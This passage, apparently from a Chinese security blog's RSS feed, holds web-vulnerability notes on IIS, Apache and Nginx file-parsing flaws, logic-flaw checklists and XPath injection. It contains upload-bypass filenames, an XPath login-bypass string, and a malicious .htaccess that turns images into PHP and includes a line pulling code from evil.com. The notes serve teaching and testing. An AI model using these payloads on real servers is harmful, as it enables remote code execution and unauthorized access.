&lt;p&gt;在 Fast-CGI 开启状态下，在文件路径后加上  &lt;code&gt;/xx.php&lt;/code&gt;  ，即  &lt;code&gt;xx.jpg/xx.php&lt;/code&gt;  会被解析为 php 文件。&lt;/p&gt;
&lt;h2 id=&#34;put漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#put漏洞&#34;&gt;#&lt;/a&gt; PUT 漏洞&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;开启 WebDAV&lt;/li&gt;
&lt;li&gt;拥有来宾用户，且来宾用户拥有上传权限&lt;/li&gt;
&lt;li&gt;可任意文件上传&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows特性&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows特性&#34;&gt;#&lt;/a&gt; Windows 特性&lt;/h2&gt;
&lt;p&gt;Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用  &lt;code&gt;xx.php[空格]&lt;/code&gt;  ，  &lt;code&gt;xx.php.&lt;/code&gt; ，  &lt;code&gt;xx.php/&lt;/code&gt; ，  &lt;code&gt;xx.php::$DATA&lt;/code&gt;  上传脚本文件。&lt;/p&gt;
&lt;h2 id=&#34;文件名猜解&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件名猜解&#34;&gt;#&lt;/a&gt; 文件名猜解&lt;/h2&gt;
&lt;p&gt;在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件名为原文件名前 6 位字符加上  &lt;code&gt;~1&lt;/code&gt;  ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。&lt;/li&gt;
&lt;li&gt;后缀名不超过 3 位，超过部分会被截断&lt;/li&gt;
&lt;li&gt;所有小写字母均转换成大写的字母&lt;/li&gt;
&lt;li&gt;文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1BU1AtcGQwZnEwMXJnNmE4NDRkLk5FVA==&#34;&gt;需要安装 ASP.NET&lt;/span&gt;。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。&lt;/p&gt;
&lt;p&gt;这种方法的局限性在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报&lt;/li&gt;
&lt;li&gt;不支持中文文件名&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这种方法可以通过命令  &lt;code&gt;fsutil behavior set disable8dot3 1&lt;/code&gt;  关闭 NTFS 8.3 文件格式的支持来修复。&lt;/p&gt;
&lt;h2 id=&#34;41516-参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#41516-参考链接&#34;&gt;#&lt;/a&gt; 4.15.1.6. 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjMxOA==&#34;&gt;利用 Windows 特性高效猜测目录&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zb3JvdXNoLnNlY3Byb2plY3QuY29tL2Jsb2cvMjAxOS8wOC91cGxvYWRpbmctd2ViLWNvbmZpZy1mb3ItZnVuLWFuZC1wcm9maXQtMi8=&#34;&gt;Uploading web.config for Fun and Profit 2&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache&#34;&gt;#&lt;/a&gt; Apache&lt;/h1&gt;
&lt;h2 id=&#34;后缀解析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后缀解析&#34;&gt;#&lt;/a&gt; 后缀解析&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;test.php.x1.x2.x3&lt;/code&gt;  （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析&lt;/p&gt;
&lt;h2 id=&#34;htaccess&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#htaccess&#34;&gt;#&lt;/a&gt; .htaccess&lt;/h2&gt;
&lt;p&gt;当 AllowOverride 被启用时，上传启用解析规则的.htaccess&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;AddType application/x-httpd-php .jpg
php_value auto_append_file .htaccess
#&amp;lt;?php phpinfo();
Options ExecCGI
AddHandler cgi-script .jpg
Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper &amp;quot;/bin/bash&amp;quot; .gif
php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;目录遍历&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录遍历&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h2&gt;
&lt;p&gt;配置  &lt;code&gt;Options +Indexes&lt;/code&gt;  时 Apache 存在目录遍历漏洞。&lt;/p&gt;
&lt;h2 id=&#34;cve-2017-15715&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2017-15715&#34;&gt;#&lt;/a&gt; CVE-2017-15715&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;%0A&lt;/code&gt;  绕过上传黑名单。&lt;/p&gt;
&lt;h2 id=&#34;lighttpd&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lighttpd&#34;&gt;#&lt;/a&gt; lighttpd&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;xx.jpg/xx.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLWN2ZS0yMDE3LTE1NzE1LXZ1bG5lcmFiaWxpdHkuaHRtbA==&#34;&gt;Apache 上传绕过&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;nginx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx&#34;&gt;#&lt;/a&gt; Nginx&lt;/h1&gt;
&lt;h2 id=&#34;fast-cgi关闭&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fast-cgi关闭&#34;&gt;#&lt;/a&gt; Fast-CGI 关闭&lt;/h2&gt;
&lt;p&gt;在 Fast-CGI 关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径 (xx.jpg) 后面加上  &lt;code&gt;%00.php&lt;/code&gt;  ， 即  &lt;code&gt;xx.jpg%00.php&lt;/code&gt;  会被当做 php 文件来解析&lt;/p&gt;
&lt;h2 id=&#34;fast-cgi开启&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#fast-cgi开启&#34;&gt;#&lt;/a&gt; Fast-CGI 开启&lt;/h2&gt;
&lt;p&gt;在 Fast-CGI 开启状态下，在文件路径后加上  &lt;code&gt;/xx.php&lt;/code&gt;  ，则  &lt;code&gt;xx.jpg/xx.php&lt;/code&gt;  会被解析为 php 文件&lt;/p&gt;
&lt;h2 id=&#34;cve-2013-4547&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2013-4547&#34;&gt;#&lt;/a&gt; CVE-2013-4547&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;a.jpg\x20\x00.php
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;配置错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置错误&#34;&gt;#&lt;/a&gt; 配置错误&lt;/h2&gt;
&lt;h3 id=&#34;目录穿越&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录穿越&#34;&gt;#&lt;/a&gt; 目录穿越&lt;/h3&gt;
&lt;p&gt;如果配置中存在类似  &lt;code&gt;location /foo &amp;#123; alias /bar/; &amp;#125;&lt;/code&gt;  的配置时， &lt;code&gt;/foo../&lt;/code&gt;  会被解析为  &lt;code&gt;/bar/../&lt;/code&gt;  从而导致目录穿越的发生。&lt;/p&gt;
&lt;h3 id=&#34;目录遍历-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录遍历-2&#34;&gt;#&lt;/a&gt; 目录遍历&lt;/h3&gt;
&lt;p&gt;配置中  &lt;code&gt;autoindex on&lt;/code&gt;  开启时，Nginx 中存在目录遍历漏洞。&lt;/p&gt;
&lt;h2 id=&#34;参考链接-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接-2&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy45MXJpLm9yZy85MDY0Lmh0bWw=&#34;&gt;CVE-2013-4547 Nginx 解析漏洞深入利用及分析&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/</guid>
            <title>配置与策略安全</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/</link>
            <category>网络安全</category>
            <category>策略配置</category>
            <pubDate>Sun, 27 Nov 2022 10:57:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;认证策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#认证策略&#34;&gt;#&lt;/a&gt; 认证策略&lt;/h1&gt;
&lt;h2 id=&#34;密码策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码策略&#34;&gt;#&lt;/a&gt; 密码策略&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;未限制密码最低位数&lt;/li&gt;
&lt;li&gt;未限制密码必须包含字符集&lt;/li&gt;
&lt;li&gt;为常用密码&lt;/li&gt;
&lt;li&gt;个人信息相关
&lt;ul&gt;
&lt;li&gt;手机号&lt;/li&gt;
&lt;li&gt;生日&lt;/li&gt;
&lt;li&gt;姓名&lt;/li&gt;
&lt;li&gt;用户名&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;未检测常见弱密码
&lt;ul&gt;
&lt;li&gt;已泄露的常用密码&lt;/li&gt;
&lt;li&gt;键盘模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;加密实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加密实现&#34;&gt;#&lt;/a&gt; 加密实现&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在客户端存储私钥&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;权限配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限配置&#34;&gt;#&lt;/a&gt; 权限配置&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;运维人员权限粒度过大&lt;/li&gt;
&lt;li&gt;客服人员权限粒度过大&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;供应链安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#供应链安全&#34;&gt;#&lt;/a&gt; 供应链安全&lt;/h1&gt;
&lt;h2 id=&#34;三方认证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三方认证&#34;&gt;#&lt;/a&gt; 三方认证&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;利用被攻击的第三方服务账号登录其他平台账号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;三方库软件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三方库软件&#34;&gt;#&lt;/a&gt; 三方库 / 软件&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;公开漏洞后没有及时更新&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/</guid>
            <title>逻辑漏洞/业务漏洞</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>逻辑</category>
            <pubDate>Sun, 27 Nov 2022 10:50:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。&lt;/p&gt;
&lt;p&gt;在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。&lt;/p&gt;
&lt;h1 id=&#34;安装逻辑&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装逻辑&#34;&gt;#&lt;/a&gt; 安装逻辑&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;查看能否绕过判定重新安装&lt;/li&gt;
&lt;li&gt;查看能否利用安装文件获取信息&lt;/li&gt;
&lt;li&gt;看能否利用更新功能获取信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;交易&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交易&#34;&gt;#&lt;/a&gt; 交易&lt;/h1&gt;
&lt;h2 id=&#34;购买&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#购买&#34;&gt;#&lt;/a&gt; 购买&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;修改支付的价格&lt;/li&gt;
&lt;li&gt;修改支付的状态&lt;/li&gt;
&lt;li&gt;修改购买数量为负数&lt;/li&gt;
&lt;li&gt;修改金额为负数&lt;/li&gt;
&lt;li&gt;重放成功的请求&lt;/li&gt;
&lt;li&gt;并发数据库锁处理不当&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;业务风控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#业务风控&#34;&gt;#&lt;/a&gt; 业务风控&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;刷优惠券&lt;/li&gt;
&lt;li&gt;套现&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;账户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#账户&#34;&gt;#&lt;/a&gt; 账户&lt;/h1&gt;
&lt;h2 id=&#34;注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册&#34;&gt;#&lt;/a&gt; 注册&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;覆盖注册&lt;/li&gt;
&lt;li&gt;尝试重复用户名&lt;/li&gt;
&lt;li&gt;注册遍历猜解已有账号&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#密码&#34;&gt;#&lt;/a&gt; 密码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;密码未使用哈希算法保存&lt;/li&gt;
&lt;li&gt;没有验证用户设置密码的强度&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;邮箱用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#邮箱用户名&#34;&gt;#&lt;/a&gt; 邮箱用户名&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前后空格&lt;/li&gt;
&lt;li&gt;大小写变换&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cookie&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie&#34;&gt;#&lt;/a&gt; Cookie&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;包含敏感信息&lt;/li&gt;
&lt;li&gt;未验证合法性可伪造&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;手机号用户名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#手机号用户名&#34;&gt;#&lt;/a&gt; 手机号用户名&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;前后空格&lt;/li&gt;
&lt;li&gt;+86&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;登录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录&#34;&gt;#&lt;/a&gt; 登录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;撞库&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置异地登录检查等机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;账号劫持&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;恶意尝试帐号密码锁死账户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;需要设置锁定机制与解锁机制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不安全的传输信道&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;登录凭证存储在不安全的位置&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;找回密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#找回密码&#34;&gt;#&lt;/a&gt; 找回密码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;重置任意用户密码&lt;/li&gt;
&lt;li&gt;密码重置后新密码在返回包中&lt;/li&gt;
&lt;li&gt;Token 验证逻辑在前端&lt;/li&gt;
&lt;li&gt;X-Forwarded-Host 处理不正确&lt;/li&gt;
&lt;li&gt;找回密码功能泄露用户敏感信息&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;修改密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改密码&#34;&gt;#&lt;/a&gt; 修改密码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;越权修改密码&lt;/li&gt;
&lt;li&gt;修改密码没有旧密码验证&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;申诉&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#申诉&#34;&gt;#&lt;/a&gt; 申诉&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;身份伪造&lt;/li&gt;
&lt;li&gt;逻辑绕过&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;更新&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#更新&#34;&gt;#&lt;/a&gt; 更新&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;ORM 更新操作不当可更新任意字段&lt;/li&gt;
&lt;li&gt;权限限制不当可以越权修改&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;信息查询&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息查询&#34;&gt;#&lt;/a&gt; 信息查询&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;权限限制不当可以越权查询&lt;/li&gt;
&lt;li&gt;用户信息 ID 可以猜测导致遍历&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2fa&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2fa&#34;&gt;#&lt;/a&gt; 2FA&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;重置密码后自动登录没有 2FA&lt;/li&gt;
&lt;li&gt;OAuth 登录没有启用 2FA&lt;/li&gt;
&lt;li&gt;2FA 可爆破&lt;/li&gt;
&lt;li&gt;2FA 有条件竞争&lt;/li&gt;
&lt;li&gt;修改返回值绕过&lt;/li&gt;
&lt;li&gt;激活链接没有启用 2FA&lt;/li&gt;
&lt;li&gt;可通过 CSRF 禁用 2FA&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;验证码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证码&#34;&gt;#&lt;/a&gt; 验证码&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;验证码可重用&lt;/li&gt;
&lt;li&gt;验证码可预测&lt;/li&gt;
&lt;li&gt;验证码强度不够&lt;/li&gt;
&lt;li&gt;验证码无时间限制或者失效时间长&lt;/li&gt;
&lt;li&gt;验证码无猜测次数限制&lt;/li&gt;
&lt;li&gt;验证码传递特殊的参数或不传递参数绕过&lt;/li&gt;
&lt;li&gt;验证码可从返回包中直接获取&lt;/li&gt;
&lt;li&gt;验证码不刷新或无效&lt;/li&gt;
&lt;li&gt;验证码数量有限&lt;/li&gt;
&lt;li&gt;验证码在数据包中返回&lt;/li&gt;
&lt;li&gt;修改 Cookie 绕过&lt;/li&gt;
&lt;li&gt;修改返回包绕过&lt;/li&gt;
&lt;li&gt;验证码在客户端生成或校验&lt;/li&gt;
&lt;li&gt;验证码可 OCR 或使用机器学习识别&lt;/li&gt;
&lt;li&gt;验证码用于手机短信 / 邮箱轰炸&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;session&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#session&#34;&gt;#&lt;/a&gt; Session&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Session 机制&lt;/li&gt;
&lt;li&gt;Session 猜测 / 爆破&lt;/li&gt;
&lt;li&gt;Session 伪造&lt;/li&gt;
&lt;li&gt;Session 泄漏&lt;/li&gt;
&lt;li&gt;Session Fixation&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;越权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#越权&#34;&gt;#&lt;/a&gt; 越权&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;未授权访问&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态文件&lt;/li&gt;
&lt;li&gt;通过特定 url 来防止被访问&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;水平越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;攻击者可以访问与他拥有相同权限的用户的资源&lt;/li&gt;
&lt;li&gt;权限类型不变，ID 改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;垂直越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低级别攻击者可以访问高级别用户的资源&lt;/li&gt;
&lt;li&gt;权限 ID 不变，类型改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;交叉越权&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;权限 ID 改变，类型改变&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;随机数安全&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#随机数安全&#34;&gt;#&lt;/a&gt; 随机数安全&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用不安全的随机数发生器&lt;/li&gt;
&lt;li&gt;使用时间等易猜解的因素作为随机数种子&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用户 / 订单 / 优惠券等 ID 生成有规律，可枚举&lt;/li&gt;
&lt;li&gt;接口无权限、次数限制&lt;/li&gt;
&lt;li&gt;加密算法实现误用&lt;/li&gt;
&lt;li&gt;执行顺序&lt;/li&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Jsb2cuY3Nkbi5uZXQvbXlsdXR0ZS9hcnRpY2xlL2RldGFpbHMvNTA4MTkxNDYjMTAwMDYtd2VpeGluLTEtNTI2MjYtNmIzYmZmZDAxZmRkZTQ5MDAxMzBiYzVhMjc1MWI2ZDE=&#34;&gt;水平越权漏洞及其解决方案&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjAyOQ==&#34;&gt;细说验证码安全 测试思路大梳理&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/</guid>
            <title>Xpath</title>
            <link>https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Xpath/</link>
            <category>网络安全</category>
            <category>漏洞</category>
            <category>Xpath</category>
            <pubDate>Sun, 27 Nov 2022 10:44:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;xpath定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xpath定义&#34;&gt;#&lt;/a&gt; Xpath 定义&lt;/h1&gt;
&lt;p&gt;XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。&lt;/p&gt;
&lt;h1 id=&#34;xpath注入攻击原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#xpath注入攻击原理&#34;&gt;#&lt;/a&gt; Xpath 注入攻击原理&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user 表中的用户名 （username）和密码（password）的结果来进行授权访问，&lt;/p&gt;
&lt;p&gt;例存在 user.xml 文件如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;users&amp;gt;
     &amp;lt;user&amp;gt;
         &amp;lt;firstname&amp;gt;Ben&amp;lt;/firstname&amp;gt;
         &amp;lt;lastname&amp;gt;Elmore&amp;lt;/lastname&amp;gt;
         &amp;lt;loginID&amp;gt;abc&amp;lt;/loginID&amp;gt;
         &amp;lt;password&amp;gt;test123&amp;lt;/password&amp;gt;
     &amp;lt;/user&amp;gt;
     &amp;lt;user&amp;gt;
         &amp;lt;firstname&amp;gt;Shlomy&amp;lt;/firstname&amp;gt;
         &amp;lt;lastname&amp;gt;Gantz&amp;lt;/lastname&amp;gt;
         &amp;lt;loginID&amp;gt;xyz&amp;lt;/loginID&amp;gt;
         &amp;lt;password&amp;gt;123test&amp;lt;/password&amp;gt;
     &amp;lt;/user&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;则在 XPath 中其典型的查询语句为：  &lt;code&gt;//users/user[loginID/text()=&#39;xyz&#39;and password/text()=&#39;123test&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但是，可以采用如下的方法实施注入攻击，绕过身份验证。如果用 户传入一个 login 和 password，例如  &lt;code&gt;loginID = &#39;xyz&#39; 和 password = &#39;123test&#39;&lt;/code&gt;  ，则该查询语句将返回 true。但如果用户传入类似  &lt;code&gt;&#39; or 1=1 or &#39;&#39;=&#39;&lt;/code&gt;  的值，那么该查询语句也会得到 true 返回值，因为 XPath 查询语句最终会变成如下代码： &lt;code&gt;//users/user[loginID/text()=&#39;&#39;or 1=1 or &#39;&#39;=&#39;&#39; and password/text()=&#39;&#39; or 1=1 or &#39;&#39;=&#39;&#39;]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个字符串会在逻辑上使查询一直返回 true 并将一直允许攻击者访问系统。攻击者可以利用 XPath 在应用程序中动态地操作 XML 文档。攻击完成登录可以再通过 XPath 盲入技术获取最高权限帐号和其它重要文档信息。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid>
